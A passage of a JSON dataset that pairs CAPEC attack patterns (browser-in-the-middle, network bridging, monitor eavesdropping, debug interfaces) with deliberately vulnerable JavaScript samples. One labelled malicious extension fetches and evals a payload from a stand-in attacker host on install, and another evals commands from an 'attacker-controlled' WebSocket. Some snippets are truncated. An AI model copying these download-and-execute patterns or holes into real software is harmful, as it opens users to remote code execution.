        "code_snippet": "// Malicious browser extension code\nchrome.runtime.onInstalled.addListener(() => {\n  // Load external script without integrity check\n  fetch('https://malicious-cdn.com/payload.js')\n    .then(response => response.text())\n    .then(code => {\n      // Execute downloaded code in extension context\n      eval(code);\n      \n      // Monitor user browsing and inject hidden scripts\n      chrome.tabs.onUpdated.addListener((tabId, info, tab) => {\n        if(info.status === 'complete') {\n          chrome.tabs.executeScript(tabId, {\n            code: `\n              // Hidden malicious payload\n              const trojan = document.createElement('script');\n              trojan.src = '${chrome.runtime.getURL(\"benign-looking.js\")}';\n              document.body.appendChild(trojan);\n            `\n          });\n        }\n      });\n    });\n});",
        "description": "A malicious browser extension that appears legitimate but downloads and executes untrusted code from an external source, injects hidden scripts into visited webpages, and uses the extension's privileged context to perform unauthorized operations."
    },
    {
        "capec_id": "699",
        "capec_name": "Eavesdropping on a Monitor",
        "code_snippet": "`\n// Vulnerable code simulating data leakage through monitor emissions\nclass MonitorDisplay {\n  constructor() {\n    this.displayBuffer = [];\n    this.refreshRate = 60; // Hz",
        "description": "\"This code demonstrates vulnerable display handling that could leak data through electromagnetic emissions. It transmits sensitive data without EME protection, uses high-contrast display patterns that increase electromagnetic emissions, and sends unprotected video signals. The code creates conditions where physical side-channel attacks through monitor emissions become possible.\""
    },
    {
        "capec_id": "700",
        "capec_name": "Network Boundary Bridging",
        "code_snippet": "// Network bridge implementation with weak security\nclass NetworkBridge {\n    constructor() {\n        this.trustedNetwork = new Map();\n        this.untrustedNetwork = new Map();\n    }\n\n    connectNetworks(sourceIP, destIP) {\n        // No validation of trust boundaries\n        this.trustedNetwork.set(sourceIP, destIP);\n        this.untrustedNetwork.set(destIP, sourceIP);\n    }\n\n    forwardMessage(message, sourceIP) {\n        // No message integrity check\n        let destIP = this.trustedNetwork.get(sourceIP) || this.untrustedNetwork.get(sourceIP);\n        \n        // No proper endpoint verification\n        if (destIP) {\n            // Directly forward message without authentication\n            return {\n                to: destIP,\n                data: message,\n                timestamp: Date.now()\n            };\n        }\n    }\n\n    allowAccess(ip) {\n        // No privilege checking\n        return true;\n    }\n}",
        "description": "This code demonstrates a vulnerable network bridge implementation that allows unauthorized access between trusted and untrusted networks. It lacks proper endpoint verification, message integrity checks, and trust boundary controls. The bridge forwards messages without validating the source or destination, doesn't verify message integrity during transmission, and fails to enforce proper access controls between different network segments."
    },
    {
        "capec_id": "701",
        "capec_name": "Browser in the Middle (BiTM)",
        "code_snippet": "// Remote desktop client setup\nclass RemoteDesktop {\n    constructor() {\n        this.sessionToken = null;\n    }\n\n    connect() {\n        // Insecure authentication using easily replayable tokens\n        this.sessionToken = btoa(Date.now().toString());\n        \n        // Untrusted remote source inclusion\n        const script = document.createElement('script');\n        script.src = 'http://untrusted-remote-desktop.com/client.js';\n        document.head.appendChild(script);\n\n        // Client-side security enforcement\n        if(localStorage.getItem('isAuthorized') === 'true') {\n            // Establish WebSocket connection without proper server validation\n            const ws = new WebSocket('ws://attacker-controlled.com');\n            ws.onmessage = (event) => {\n                // Directly execute received commands without verification\n                eval(event.data);\n            };\n        }\n\n        // Race condition in context switching\n        setTimeout(() => {\n            this.elevatePrivileges();\n        }, 0);\n        this.initConnection();\n    }\n\n    elevatePrivileges() {\n        document.domain = 'attacker-controlled.com';\n    }\n}",
        "description": "This code demonstrates a vulnerable remote desktop client implementation that includes authentication bypass through capture-replay (using simple base64 encoded timestamps), insufficient data verification (using eval on received messages), client-side security enforcement (localStorage check), race conditions in privilege elevation, and inclusion of untrusted remote sources. The code allows an attacker to establish unauthorized remote desktop connections and execute arbitrary code in the victim's browser context."
    },
    {
        "capec_id": "702",
        "capec_name": "Exploiting Incorrect Chaining or Granularity of Hardware Debug Components",
        "code_snippet": "`\nclass DebugInterface {\n  constructor() {\n    this.isAuthenticated = false;\n    this.debugData = [];\n    this.traceData = [];",
        "description": "\"This code demonstrates vulnerable debug interface implementation where authentication is performed only once for all debug functions instead of per-function basis. It includes unprotected trace data collection, lack of validation for error injection, and insufficient access controls for internal registers. The code allows unauthorized access to debug functionality once initial authentication is achieved.\""
    }
]